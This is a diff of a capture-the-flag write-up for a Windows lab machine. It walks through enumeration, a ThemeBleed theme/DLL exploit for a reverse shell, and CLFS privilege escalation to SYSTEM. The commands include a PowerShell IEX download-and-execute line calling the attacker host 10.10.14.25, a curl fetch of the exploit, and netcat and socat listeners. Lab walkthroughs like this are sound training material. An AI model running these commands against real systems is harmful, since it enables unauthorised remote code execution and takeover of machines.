@@ -2,7 +2,7 @@
 - 
 ## Nmap Enumeration
 - We pass the commands:
-```bash
+```
 nmap -sV -sC -vv 10.10.11.237
 nmap -sU --top-ports=10 -vv 10.10.11.237
 
@@ -24,7 +24,7 @@ n/a
 ## Directory Enumeration
 - Gobuster:
 	- Directory
-```bash
+```
 gobuster dir -u http://10.10.11.237 dns --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.root
 
 ---OUTPUT---
@@ -37,11 +37,11 @@ gobuster dir -u http://10.10.11.237 dns --wordlist /usr/share/wordlists/dirbuste
 
 ```
 		- Next Directory
-```bash
+```
 
 ```
 	- VHost
-```bash
+```
 gobuster vhost
 ```
 - Ffuf
@@ -49,7 +49,7 @@ gobuster vhost
 ffuf
 ```
 - Dirsearch
-```bash
+```
 dirsearch -u
 ```
 - Dirbuster
@@ -65,7 +65,7 @@ dirsearch -u
 - On google we find Windows themes use a .theme extension
 	- We also find a vulnerability : CVE-2024-38146
 		- https://socprime.com/blog/cve-2023-38146-detection-windows-themebleed-rce-bugposes-growing-risks-with-the-poc-exploit-release/
-```bash
+```
 The researcher Gabe Kirkpatrick who was the [first to report ThemeBleed](https://exploits.forsale/themebleed/) and the developer of the PoC code has covered the in-depth attack details. Leveraging the version number “999” creates a significant time gap in the process of verifying the DLL signature and library load within the routine for handling the MSSTYLES file, which can cause the emergence of a race condition. Further on, by applying the specifically generated MSSTYLES file, adversaries can exploit a race window to apply malicious DLL instead of a verified one, which enables them to run arbitrary code on the impacted system. In addition, the researcher adds that downloading a malicious Windows Theme file from the web triggers the ‘mark-of-the-web’ warning, which can notify a user of the potential threat. However, adversaries can bypass this alert by wrapping the theme into a THEMEPACK archive file.
 ```
 - Extra: Can bypass warning with .themepack archive file
@@ -130,41 +130,41 @@ void VerifyThemeVersion() {
 }
 
 ```
-					- Mainly removed some unneeded checks but most importantly:
-						- Added VerifyThemeVersion which is was the POC said was required for our exploit.
-							- Returns null hence void
-	- We install mingw-w64 to creatae a dll from this code:
-```bash
+- Mainly removed some unneeded checks but most importantly:
+	- Added VerifyThemeVersion which is was the POC said was required for our exploit.
+		- Returns null hence void
+- We install mingw-w64 to creatae a dll from this code:
+```
 sudo apt install mingw-w64
 x86_64-w64-mingw32-gcc-win32 windows.c -shared -lws2_32 -o VerifyThemeVersion.dll
 ```
-	- Now we need to use our Windows Machine and download ThemeBleed POC.
-		- Might have to restore as Defender will delete
-		- Need to pull our dll file from our Kali machine to here
-			- To test if exploit is working:
-				- in c file change IP to the one that can be reached by Windows machine.
-					- in Windows machine pass this command with netcat listening on Kali:
-```bash
+- Now we need to use our Windows Machine and download ThemeBleed POC.
+	- Might have to restore as Defender will delete
+	- Need to pull our dll file from our Kali machine to here
+		- To test if exploit is working:
+			- in c file change IP to the one that can be reached by Windows machine.
+				- in Windows machine pass this command with netcat listening on Kali:
+```
 rundll32 VerifyThemeVersion.dll,VerifyThemeVersion
 ```
-						- Should get shell. Remember to change IP back to tun0 IP
-			- Use python server and pull it from Windows via the IP reachable to Kali machine:port
-		- We make our exploit theme with ThemeBleed.exe
-```bash
+- Should get shell. Remember to change IP back to tun0 IP
+- Use python server and pull it from Windows via the IP reachable to Kali machine:port
+- We make our exploit theme with ThemeBleed.exe
+```
 ThemeBleed.exe make_theme 10.10.14.25 exploit.theme
 ```
-			- Send it to our Kali Machine. (I had a shared folder so sent it via that)
-		- Delete stage_3 of our ThemeBleed data and replace it with our dll exploit.
-			- Renake our exploit stage_3
-		- Start the ThemeBleed server on Windows.
-			- We need to disable server service on Windows (and restart) as themebleed needs port 445 to listen
-			- On our Kali machine we need to forward anything from 445 to our Windows machine:
-```bash
+- Send it to our Kali Machine. (I had a shared folder so sent it via that)
+- Delete stage_3 of our ThemeBleed data and replace it with our dll exploit.
+	- Remake our exploit stage_3
+- Start the ThemeBleed server on Windows.
+	- We need to disable server service on Windows (and restart) as themebleed needs port 445 to listen
+	- On our Kali machine we need to forward anything from 445 to our Windows machine:
+```
 sudo socat TCP-LISTEN:445,fork,reuseaddr TCP:192.168.193.1:445
 ```
-		- We then turn on our netcat listener and upload our exploit.theme
-			- We should get an output like this. Basically a race condition is created and everytime it asks for dll, it changes slightly and eventually our exploit is run. It should succeed when it hits `LoadLibrary` and get a reverse shell on our listener
-```bash
+- We then turn on our netcat listener and upload our exploit.theme
+	- We should get an output like this. Basically a race condition is created and everytime it asks for dll, it changes slightly and eventually our exploit is run. It should succeed when it hits `LoadLibrary` and get a reverse shell on our listener
+```
 D:\OSCP\ThemeBleed>ThemeBleed.exe server
 Server started
 Client requested stage 1 - Version check
@@ -185,11 +185,11 @@ Client requested stage 2 - Verify signature
 Client requested stage 1 - Version check
 Client requested stage 1 - Version check
 ```
-		- We gain access as user sam.emerson
-			- user.flag
+- We gain access as user sam.emerson
+	- user.flag
 ## Privilege Escalation
 - In documents folder we see a CVE pdf file. We need to get it to our local machine to read it.
-```bash
+```
 cd ../Documents
 powershell
 $b64 = [Convert]::ToBase64String([IO.FILE]::ReadAllBytes("CVE-2023-28252_Summary.pdf"))
@@ -200,8 +200,8 @@ JVBERi0xLjYKJcOkw7zDtsOfCjIgMCBvYmoKPDwvTGVuZ3RoIDMgMCBSL0ZpbHRlci9GbGF0ZURlY29k
                                  <SNIP>
 MDIwMDAzNzAwMkUwMDM0PgovQ3JlYXRpb25EYXRlKEQ6MjAyMzA5MjExODE4MTQrMDInMDAnKT4+CmVuZG9iagoKeHJlZgowIDE0CjAwMDAwMDAwMDAgNjU1MzUgZiAKMDAwMDAxMzIwNSAwMDAwMCBuIAowMDAwMDAwMDE5IDAwMDAwIG4gCjAwMDAwMDE1NTAgMDAwMDAgbiAKMDAwMDAxMzMwMyAwMDAwMCBuIAowMDAwMDAxNTcxIDAwMDAwIG4gCjAwMDAwMTE5ODcgMDAwMDAgbiAKMDAwMDAxMjAwOSAwMDAwMCBuIAowMDAwMDEyMTk3IDAwMDAwIG4gCjAwMDAwMTI3MzcgMDAwMDAgbiAKMDAwMDAxMzExOCAwMDAwMCBuIAowMDAwMDEzMTUwIDAwMDAwIG4gCjAwMDAwMTM0MDIgMDAwMDAgbiAKMDAwMDAxMzQ5OSAwMDAwMCBuIAp0cmFpbGVyCjw8L1NpemUgMTQvUm9vdCAxMiAwIFIKL0luZm8gMTMgMCBSCi9JRCBbIDw2MjVDNEQ2QjQ3NjREOUI3QzdDQzg0OTg1MTlGQzYxMj4KPDYyNUM0RDZCNDc2NEQ5QjdDN0NDODQ5ODUxOUZDNjEyPiBdCi9Eb2NDaGVja3N1bSAvRjBBQkY4NUJDOEIxQjkxRUYzMkVBNkM5RTUzM0QwMTQKPj4Kc3RhcnR4cmVmCjEzNjc0CiUlRU9GCg==
 ```
-	- We copy it to a file in our Kali machine:
-```bash
+- We copy it to a file in our Kali machine:
+```
 vi CVE-2023-28252_Summary.b64 # copy contents here
 base64 -d CVE-2023-28252_Summary.b64 > CVE-2023-28252_Summary.pdf
 open CVE-2023-28252_Summary.pdf
@@ -211,30 +211,29 @@ open CVE-2023-28252_Summary.pdf
 		- It explains the whole process and as an identifier it spawns the notepad app.
 			- We open this in Visual Studio and replace the notepad with our Reverse Shell
 	- On our kali machine we get our TCP reverse shell ready and name it `onelinereverse.ps1`
-```bash
+```
 sudo cp /opt/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 onelinereverse.ps1
 vi onelinerreverse.ps1 # add our details
 ```
-	- We download the github repository on our Windows machine and open `clfs_eop.sln` on Visual Studio (**NOT Visual Studio Code**)
-	- we search for the notepad call (search for notepad or system as its a system call)
-		- We replace it with:
+- We download the github repository on our Windows machine and open `clfs_eop.sln` on Visual Studio (**NOT Visual Studio Code**)	- we search for the notepad call (search for notepad or system as its a system call)
+	- We replace it with:
 ```c
 		if (strcmp(username, "SYSTEM") == 0){
 			printf("WE ARE SYSTEM\n");
 			system("powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.25:8001/onelinereverse.ps1')");
 ```
-		- We Rebuilt it (Build> Rebuilt Solution)
-			- Shows the file path.
-			- We copy the exe file to our kali machine. (I have a shared folder so I copied it via that)
-				- Keep the file in the same location as reverse shell where we will start up our server
-```bash
+- We Rebuilt it (Build> Rebuilt Solution)
+	- Shows the file path.
+	- We copy the exe file to our kali machine. (I have a shared folder so I copied it via that)
+		- Keep the file in the same location as reverse shell where we will start up our server
+```
 python3 -m http.server 8001
 ```
-				- We also turn on our netcat listener at the port we specified:
-```bash
+- We also turn on our netcat listener at the port we specified:
+```
 nc -lvnp 9999
 ```
-			- Then on our target machine (as sam.enderson) we pass the command calling our exe file and then we execute it.
+- Then on our target machine (as sam.enderson) we pass the command calling our exe file and then we execute it.
 ```powershell
 curl http://10.10.14.25:8001/clfs_eop.exe -o clfs_eop.exe
 .\clfs_eop.exe
@@ -292,30 +291,4 @@ Closing Handle
 ACTUAL USER=SYSTEM
 
 ```
-	- We get reverse shell on our listener as admin user
-
-
-
-### Via BurpSuite
-- 
-
---------------
-## Initial Foothold in Website
-- 
-
-------------
-## Privilege Escalation in Website
-- 
-
-----------
-## Initial Foothold in Target
-
-- 
-----------
-## Lateral Movement in Target
-- 
------------
-## Privilege Escalation in Target
-- 
--------
---------
+- We get reverse shell on our listener as admin user
